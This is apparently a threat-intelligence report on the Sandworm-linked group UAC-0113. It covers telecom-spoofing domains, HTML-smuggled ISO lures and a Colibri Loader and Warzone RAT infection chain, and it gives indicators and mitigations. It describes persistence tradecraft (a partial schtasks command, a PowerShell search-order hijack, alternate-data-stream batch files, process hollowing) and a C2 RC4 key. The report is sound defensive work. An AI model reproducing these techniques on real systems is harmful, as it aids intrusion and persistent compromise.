This report profiles the unique infrastructure used by the threat activity group 
UAC-0113, which is linked with moderate confidence by CERT-UA to Sandworm. 
The activity was identified through a combination of large-scale automated network 
traffic analytics and analysis derived from open source reporting. The report will 
be of most interest to individuals engaged in strategic and operational intelligence 
relating to the activities of the Russian government in cyberspace and network 
defenders.
Executive Summary
Recorded Future continues to monitor cyber espionage 
operations targeting government and private sector organizations 
across multiple geographic regions including Ukraine. From 
August 2022, Recorded Future observed a steady rise in 
command and control (C2) infrastructure used by the threat 
activity group tracked by Computer Emergency Response Team 
of Ukraine (CERT-UA) as UAC-0113.
UAC-0113 has been linked by CERT-UA to the Russian 
advanced persistent threat (APT) group Sandworm. This report 
highlights trends observed by Insikt Group while monitoring 
UAC-0113 infrastructure, including the recurring use of dynamic 
DNS domains masquerading as telecommunication providers 
operating in Ukraine, which shows that the group’s efforts to 
target entities in Ukraine remains ongoing. Domain masquerades 
can enable spearphishing campaigns or redirects that pose a 
threat to victim networks.
Using a combination of proactive adversary infrastructure 
detections and domain analysis techniques, Insikt Group 
determined that UAC-0113’s use of this newly discovered 
infrastructure overlaps with other infrastructure tactics, 
techniques, and procedures (TTPs) previously attributed to 
the group by CERT-UA. The information and TTPs provided in 
this report enables defenders to better search for and protect 
against activity by UAC-0113.
Key Judgments
•	 Insikt Group has identified new infrastructure used 
by UAC-0113, a group linked with medium confidence 
to Sandworm by CERT-UA. Sandworm is a Russian 
advanced persistent threat (APT) group affiliated with 
the Main Intelligence Directorate/Main Directorate (GRU/
GU) of the General Staff of the Armed Forces of the 
Russian Federation.
•	 Identified staging infrastructure continues the trend of 
masquerading as telecommunication providers operating 
within Ukraine and delivers malicious payloads via an 
HTML smuggling technique that deploys Colibri Loader 
and Warzone RAT malware.
•	 Though the intent of the observed decoy document 
found in connection with this activity is not fully known, 
it’s likely to be deployed against Ukraine-based targets in 
support of military action in the region similar to previous 
UAC-0113 lures. 
•	 A transition from DarkCrystal RAT to Colibri Loader and 
Warzone RAT demonstrates UAC-0113’s broadening but 
continuing use of publicly available commodity malware.
Background
On June 24, 2022, a report by CERT-UA detailed the use 
of the DarkCrystal remote access trojan (RAT) by UAC-0113, a 
group CERT-UA has indicated as being linked to Sandworm, a 
Russian Main Intelligence Directorate/Main Directorate (GRU/
GU) related threat group. The CERT-UA report indicated that 
UAC-0113 was employing a malicious lure document which 
deployed DarkCrystal RAT. This activity likely targeted entities 
in Ukraine, specifically individuals or entities seeking information 
about Ukrainian military service personnel in relation to matters 
of legal assistance. Although the theme of this lure document 
was focused on military personnel legal matters, CERT-UA noted 
that the attack was also likely targeted at telecommunications 
providers of Ukraine.
DarkCrystal RAT is a commodity malware dating back to 
at least 2018; a sample of the malware was posted to Hybrid 
Analysis in November of that same year. Since its initial 
discovery, reporting indicates that it has been offered for sale 
in underground forums, likely making it a tool of interest to a wide 
range of threat actor groups, including those entities seeking an 
infostealer that can hinder attribution efforts by government or 
security professionals.

Analysis of infrastructure linked to UAC-0113 uncovered 
a newly identified malicious ISO file (SHA256: 1c6643b4796
1 4 3 4 0 0 9 7a 8 0 7 1 c 9 f 8 8 0 6 8 8 a f 5 a 8 2 d b 7 b 6 e 7 5 5 b e a f e
7301eea1abf) as part of an HTML smuggling technique. The 
ISO file contained a lure document, written in Ukrainian, that 
masquerades as a request for discounts on fuel for citizens of the 
Oleksandrivka Raion (district), an area in Donetsk. Additionally, 
the ISO file delivers an executable that deploys both Colibri 
Loader and Warzone RAT to the target machine.
Colibri Loader, first reported by Insikt Group in August 
2021, is a commodity malware leased on XSS Forum by the user 
“c0d3r_0f_shr0d13ng3r”. It is written in assembly and C to target 
Windows operating systems without any dependencies. On March 
11, 2022, Cloudsek researchers described Colibri Loader as “a 
type of malware that is used to load more types of malware into 
the infected system” which has “multiple techniques that help 
avoid detection”. On April 5, 2022, Malwarebytes researchers 
also reported on the operations of the Colibri Loader and further 
detailed its functionality, including its ability to “deliver and 
manage payloads onto infected computers”.
Warzone RAT (also known as Ave Maria Stealer) is a popular 
commodity remote access tool (RAT) that has been in active 
development since 2018. It is sold on underground forums 
and on the developer’s website, warzone[.]ws. The malware is 
advertised as a full-featured RAT developed in C/C++ that claims 
to be “easy to use and highly reliable.”
Threat and Technical Analysis
Insikt Group used intelligence provided by CERT-UA to 
discover further infrastructure linked to UAC-0113. The information 
uncovered suggests that it is highly likely that this threat group 
is continuing to masquerade as telecommunication providers 
operating within Ukraine. While monitoring the infrastructure, 
Insikt Group observed a malicious ISO file embedded in the 
HTML code, suggesting that domains and related IP addresses 
have likely already been, or are soon to become, operationalized.
Infrastructure
A domain noted in CERT-UA’s June report on UAC-0113, 
datagroup[.]ddns[.]net, was likely masquerading as the Ukrainian 
telecommunications company Datagroup. This domain resolved 
to the IP address 31[.]7[.]58[.]82, which also hosted a further 
domain, kyiv-star[.]ddns[.]net, likely masquerading as the 
Ukrainian telecommunications company Kyivstar.
Analysis of these domains and their related shared IP address 
revealed a ZeroSSL TLS certificate hosted on port 443 with the 
Subject Common Name datagroup[.]ddns[.]net. No certificate 
for kyiv-star[.]ddns[.]net was found. The server banner for IP 
address 31[.]7[.]58[.]82 is detailed below in Figure 2.

ett[.]ddns[.]net
Insikt Group identified further domain likely linked to UAC-
0113, ett[.]ddns[.]net, hosted between July 7 and 15, 2022, on 
IP address 103[.]150[.]187[.]121. The domain ett[.]ddns[.]net is 
likely a spoof of the legitimate domain for EuroTransTelecom 
LLC, ett[.]ua, a Ukrainian telecommunications operator. This 
new infrastructure has several overlaps with the infrastructure 
noted in the CERT-UA reports, such as the use of the Dynamic 
DNS provider NO-IP with a domain masquerading as a 
telecommunications provider operating in Ukraine, the use of 
a TLS certificate from a free TLS certificate provider, and a 
server banner that shares similarities with the banner seen on 
IP address 31[.]7[.]58[.]82 shown above in Figure 2.
darkett[.]ddns[.]net
In addition to the ett[.]ddns[.]net domain, SecurityTrails 
banner data identifies a similarly named domain, darkett[.]
ddns[.]net, hosted on the same IP address, 103[.]150[.]187[.]121, 
as ett[.]ddns[.]net. The domain darkett.ddns[.]net also uses a 
TLS certificate provided by ZeroSSL, similar to the previously 
observed domain datagroup[.]ddns[.]net.
Further analysis of the domain darkett.ddns[.]net revealed 
that between July 15 and 16, 2022, the domain was also hosted 
on IP address 94[.]153[.]171[.]42. Historical DNS for IP address 
94[.]153[.]171[.]42 also lists a resolution for the domain kievstar[.]
online on July 12, 2022.
kievstar[.]online
On July 12, 2022, the domain kievstar[.]online moved from IP 
address 94[.]153[.]171[.]42 to multiple content delivery network 
(CDN) IP addresses hosted by Cloudflare. Further analysis of the 
domain kievstar[.]online details a Let’s Encrypt TLS certificate 
that was created on July 12, 2022.
103[.]150[.]187[.]121, ett[.]hopto[.]org and star-link[.]
ddns[.]net
On August 1, 2022, SecurityTrails identified further updates 
to the IP address 103[.]150[.]187[.]121, listing a new TLS 
certificate for the domain ett[.]hopto[.]org. This TLS certificate 
is also provided by ZeroSSL and was created on July 13, 2022. 
On July 13, 2022, the domain ett[.]hopto[.]org resolved to the IP 
address 217[.]77[.]221[.]199. Further analysis of this IP address 
also details the resolution of the domain, star-link[.]ddns[.]net, 
on August 15, 2022, again likely spoofing a telecommunications 
company, Starlink (operated by American manufacturer SpaceX), 
which is reportedly assisting Ukraine in the conflict with Russia.

star-cz[.]ddns[.]net
Analysis of the domain star-cz.ddns[.]net, reported by 
CERT-UA on June 10, 2022, shows a resolution to the IP address 
103[.]27[.]202[.]127. A further domain, kyivstar[.]online, was also 
found to resolve to this same IP address and the use of this 
domain continues with the theme of emulating telecommunication 
providers in Ukraine. The aforementioned use of the similar 
domain kievstar[.]online is of note as the spelling is not typically 
employed in Ukraine but has been employed previously by the 
international community, as well as historically during Soviet 
times, and has now been carried into Russian domestic colloquial 
use.

kievstar[.]online, and IP addresses 103[.]150[.]187[.]121 and 
217[.]77[.]221[.]199 have all hosted, at various times, the same 
web page. The web page features the Ukrainian-language text 
“ОДЕСЬКА ОБЛАСНА ВІЙСЬКОВА АДМІНІСТРАЦІЯ” which 
translates as “Odesa Regional Military Administration”, along 
with “File is downloaded automatically” in English as shown in 
Figure 9 below.

Contained within the HTML of the webpage is a Base64-
encoded ISO file that is deployed via the HTML smuggling 
technique. This ISO file is set to auto-download when the website 
is visited. Figure 10 below shows the HTML content of the file.

identified that as of September 5th, 2022, the staging servers, kievstar[.]online, 
and IP address 103[.]150[.]187[.]121 have been updated and are now serving 
new malicious lure files via HTML smuggling. The newly identified lure files 
masquerade as a “password leak” and deliver Eternity Stealer malware.

Insikt Group inspected the web page’s HTML, and identified 
embedded JavaScript, which assists in the malicious ISO delivery 
behavior of the page. Testing the functionality of the for loop on 
lines 26 to 28 does not change the Base64-encoded data held 
in the variable “binary”. The for loop attempts to take away the 
integer value 11 from the characters that make up the Base64 
string. JavaScript will produce an error when attempting to 
subtract an integer from a char, resulting in its value not being 
updated. The Base64 contents of the variable “binary” will be 
exactly the same after going through the for loop, making it 
redundant, and the Base64 data will still correctly decode to 
an ISO file.
The purpose of the inclusion of this routine by UAC-0113 
could be due to operator error, as its functionality serves no 
purpose because strings are immutable objects in JavaScript.
Of note, a report by Palo Alto’s Unit42 details a similar HTML 
Smuggling routine used by APT29 in a separate campaign to 
download an ISO file, shown below in Figure 11. APT29’s original 
use of this routine was for a binary array, which helps to 
potentially illuminate UAC-0113’s redundant for loop’s original 
purpose. APT29’s HTML and JavaScript code has similar overlaps 
with the UAC-0113 linked sample shown in Figure 10 above.

APT29’s correctly functioning for loop routine can be seen on 
lines 11-13 shown in Figure 11 above and further detailed in Figure 
12 below, which is used to subtract the integer 17 from each of 
the decimal values in the variable “d”, which deobfuscates the 
malicious ISO payload.
Further comparison of the 2 routines highlights some 
cosmetic changes, possibly to frustrate security researchers and 
hinder signaturing of these functions.

It is currently unknown why there is a similarity overlap 
between the 2 threat actor groups’ use of this ISO delivery 
functionality; one hypothesis is that UAC-0113 took inspiration 
from or directly copied this functionality from open source 
reporting on APT29, or that the same open source resource was 
used as a codebase.

An analysis of the UAC-0113 ISO file and its content was 
conducted by Insikt Group and is detailed in the following 
sections.

The directory “ЗАЯВА” and “jfilyg7.exe” file were both 
configured as hidden, and would not normally be visible to the 
victim by default.
ЗАЯВА-на-отримання-компенсації.lnk
The malicious shortcut (LNK) file is visible by default to 
the victim and is used to initiate a malicious PowerShell script. 
The LNK file is configured to use a Windows folder icon, as 
shown in Figure 15 below, likely in an attempt to masquerade 
as a legitimate folder. The shortcut file contains the comment 
“WORKED3”, possibly indicating that this is the third attempt to 
create the malicious payload.
The target of the shortcut is powershell.exe, which is executed 
with a small script provided as a command line argument via 
the Command option. The PowerShell script, shown in Figure 15 
below, determines the drive letter that the ISO file is mounted on 
by iterating over each of the system’s available drives looking for 
hidden files located in the root of the filesystem with a filename 
containing the string “jfilyg7”. Once the drive letter is identified, 
it proceeds to open the “ЗАЯВА” folder using the Invoke-Item 
cmdlet and also executes “jfilyg7.exe” using the Start-Process 
cmdlet.

jfilyg7.exe 
The main payload, jfilyg7.exe, is an instance of Colibri 
Loader used to deliver Warzone RAT to the victim’s system. 
The loader communicates2 with its command-and-control (C2) 
server over HTTP using a combination of RC4 encryption and 
Base64 encoding, and is capable of downloading new payloads 
to execute and removing itself from victim systems.
Figure 17, shown below, provides an overview of the actions 
performed by each malware.
Upon execution, jfilyg7.exe decrypts 2 embedded portable 
executable (PE) file payloads. The first PE file is a copy of Colibri 
Loader that is written to “C:\ProgramData\conhost.exe” and 
executed. The second PE file is a copy of WarzoneRAT that is 
injected into a spawned copy of jfilyg7.exe via process hollowing.
2  https[:]//fr3d[.]hk/blog/colibri-loader-back-to-basics
Colibri Loader
Colibri Loader’s conhost.exe process follows a similar pattern 
as jfilyg7.exe, as shown in Figure 18 below. It decrypts a PE file 
payload, spawns a copy of itself, and then uses process hollowing 
to execute the payload. The injected payload is another instance 
of Colibri Loader that is used to communicate with its C2 server 
and establish persistence on the victim machine.
For persistence, Colibri Loader drops a copy of itself in 
“%APPDATA%\Local\Microsoft\WindowsApps” folder as Get-
Variable.exe. It then creates the seemingly benign-looking 
scheduled task shown in Figure 19 to execute a hidden instance 
of PowerShell.
schtasks.exe /create /tn COMSurrogate /st 00:00

When run, the scheduled task takes advantage of a 
searching order hijacking vulnerability in PowerShell identified 
by MalwareBytes in April 2022. The Get-Variable cmdlet is 
used as part of PowerShell’s initialization; however, PowerShell 
searches for the cmdlet using the default path (containing the 
WindowsApps directory) first, and therefore executes the Colibri 
payload instead of the legitimate Get-Variable cmdlet.
Finally, the Colibri Loader process begins communication 
with its C2. To do this, it generates a UID3 based on the victim 
machine’s serial number and sends it via a “check” command to 
the C2. Once the C2 responds, it follows up with an “update” 
command to provide the C2 with information about the victim 
machine. It then sends a “ping” command that is used to check 
for further instructions from the C2, such as downloading a new 
payload or cleaning up an infected system.
A full configuration extraction of the Colibri Loader sample 
is provided below in Table 2. It shows that the Colibri Loader is 
version 1.2.0, the botnet identifier is “Build1”, and 2 C2 addresses 
are provided.

Warzone RAT
The Warzone RAT payload also establishes persistence on 
the victim machine. It employs 2 methods: a batch file placed in 
the user’s Startup folder and a registry run key.
Warzone RAT drops a copy of itself in the “ApplicationData” 
alternate data stream (ADS) of a file named “Documents” located 
in the user’s Documents folder. A batch file named “programs.
bat” is also created and placed in the user’s “%AppData%\
Roaming\Microsoft\Windows\Start Menu\Programs\Startup” 
folder. This file contains commands to loop through another 
ADS stored in the “programs.bat” file named “start” and 
executes each line within the stream. The “programs.bat:start” 
ADS contains a wmic command to create a process from the 
Documents:ApplicationData ADS. The full contents of the 
programs.bat file and its start ADS are provided in Figures 20 
and 21.

For the other persistence method, Warzone RAT drops a copy 
of itself in the user’s Documents folder as MSCommonDriver.exe 
and sets the registry run key shown below to the dropped file’s 
path. The file name MSCommonDriver.exe has also previously 
been used by UAC-0113 during their deployment of DarkCrystal 
RAT.

ЗАЯВА/3_ЗАЯВА-на-отримання-компенсації-
додаткової-знижки-сімям-загиблих2.doc 
A decoy document, titled “3_ЗАЯВА-на-отримання-
компенсації-додаткової-знижки-сімям-загиблих2.doc”, found 
inside the folder “ЗАЯВА”, is shown in Figure 23. The document 
is opened via the commands executed by the aforementioned 
LNK file ЗАЯВА-на-отримання-компенсації.lnk. The folder and 
document translate from Ukrainian to English as “APPLICATION” 
and “3_APPLICATION-for-receiving-compensation-additional-
discount-for-the-families-of-the-deceased2.doc”, respectively.
The document itself does not engage in malicious activity 
but is used to hide the operations undertaken by the malicious 
LNK file. The Ukrainian-language text details that the document 
is an application for citizens to request discounts on fuel from 
the head of the Zaporozhye Regional Department for Social 
Protection in the Oleksandrivka Raion (district), an area in 
Donetsk.
Colibri Loader and Warzone Rat C2 Analysis
Colibri Loader C2 Servers
Network analysis of the Colibri Loader sample 
reveals 
communication 
to 
2 
distinct 
domains, 
yugyuvyugguitgyuigtfyutdtoghghbbgyv[.]cx, which as of 
August 1, 2022, resolves to IP address 65[.]108[.]213[.]210, and 
zpltcmgodhvvedxtfcygvbgjkvgvcguygytfigj[.]cc, which between 
June 28, 2022, and up until July 28, 2022, also resolved to the 
aforementioned IP address 65[.]108[.]213[.]210. As of July 28, 
2022, zpltcmgodhvvedxtfcygvbgjkvgvcguygytfigj[.]cc resolves 
to a CDN IP address hosted by Cloudflare. Insikt Group is unable 
to definitively state if UAC-0113 is the sole owner or operator 
of these C2 domains, or if they are owned or controlled by the 
threat actors or authors behind Colibri themselves. 
Searches within Hatching Triage’s public sandbox revealed 
30 distinct uploaded samples that have also communicated with 
both of these Colibri Loader C2 domains, with the earliest sample 
submitted on July 4, 2022. Within the 30 samples, there are also 
references to a range of other malware including:
•	 Raccoon Stealer
•	 RedLine Stealer
•	 Socelars
•	 Nymaim
•	 PrivateLoader
•	 Dark Crystal RAT
•	 Djvu Ransomware
•	 Vidar Stealer
Warzone Rat C2 Server
Network analysis of the Warzone RAT sample deployed by file 
“jfilyg7.exe”, revealed communication to 2 C2 domains, darkfox[.]
ddns[.]net, which resolves to IP address 94[.]158[.]156[.]4 and 
is listed as being hosted in the city of Odesa, Ukraine, and 
darksea[.]ddns, which resolves to IP address 91[.]200[.]114[.]141 
which is listed as being hosted in Lviv, Ukraine.

Port 8291
Analysis of the 2 IP addresses revealed that both have port 
8291 open and return a “MikroTik WinBox” banner. MikroTik 
Winbox is an application to aid in the administering of MikroTik 
RouterOS devices4. Sandworm has historically exploited MikroTik 
routers as part of a wide-scale botnet known as VPNFilter and 
Cyclops Blink. VPNFilter, which was initially identified in June 
2018, and Cyclops Blink, which was discovered in February 2022, 
affected MikroTik routers as well as a wide range of routing 
devices produced by other manufacturers.

Port 443
IP address 94[.]158[.]156[.]4, linked to the darkfox[.]ddns[.]
net, also had port 443 open. Analysis of port 443 returns 12 
bytes of data, which is consistent with known Warzone RAT 
server responses.

Further analysis of the Warzone RAT sample jfilyg7.exe 
revealed that it uses a custom implementation of the RC4 
cipher with a decryption key of “nevergonnagiveyouup” for 
C2 communications. Inskit Group was able to decrypt the 
bytes returned by the Warzone Rat C2 hosted on IP address 
94[.]158[.]156[.]4 via the custom RC4 cipher with the key shown 
4 https://whatportis.com/ports/8291_winbox-default-on-a-mikrotik-
routeros-for-a-windows-application-used-to-administer-mikrotik-routeros
in Figure 27. The decrypted bytes conform to the expected 
packet structure previously reported by Checkpoint.

Mitigations
The delivery of Warzone RAT and Colibri Loader, along 
with their C2 communication, is best detected using intrusion 
detection systems (IDS) like Snort. Users should conduct the 
following measures to detect and mitigate activity associated 
with these pieces of malware: 
•	 Configure your intrusion detection systems (IDS), 
intrusion prevention systems (IPS), or any network 
defense mechanisms in place to alert on — and upon 
review, consider blocking connection attempts to and 
from — the external IP addresses and domains listed in 
the appendix.
•	 Recorded Future Hunting Packages can be used to 
hunt for the presence of malicious files associated with 
Warzone RAT and Colibri Loader. YARA rules for each 
malware family can be found in Appendix D.
•	 Recorded Future proactively detects malicious server 
configurations and provides means to block them in 
the Command and Control Security Control Feed. The 
Command and Control Feed includes tools used by 
UAC-0113 and other Russian state-sponsored threat 
activity groups. Recorded Future clients should alert on 
and block these C2 servers to allow for detection and 
remediation of active intrusions.
•	 Recorded Future Threat Intelligence (TI), Third-Party 
Intelligence, and SecOps Intelligence modules users can 
monitor real-time output from Network Traffic Analysis 
analytics to identify suspected targeted intrusion activity 
involving your organization or key vendors and partners.
•	 Monitor for domain abuse, such as typosquat domains 
spoofing your organization, through the Recorded 
Future Brand Intelligence (BI) module. The SecurityTrails 
extension is available to any customer that has a 
subscription to the Threat Intelligence or Brand 
Intelligence modules. The LogoType source and alerting 
is exclusive to the BI module, though the TI module does 
have access to the data via the Advanced Query Builder.

Outlook
Insikt Group continues to track UAC-0113 infrastructure 
observing changes in TTPs as its operations diversify across 
Ukraine, this time with a significant focus on telecommunication 
providers. There has been a notable continuation of the use 
of publically available commodity malware showing UAC-0113 
adapting its operations with a willingness to use a variety of 
tooling.
Readers should detect, block, and hunt for the presence of 
the indicators referenced in connection with UAC-0113 reporting 
via the Recorded Future Platform in your network monitoring, 
intrusion detection systems, firewalls, and any associated 
perimeter security appliances.
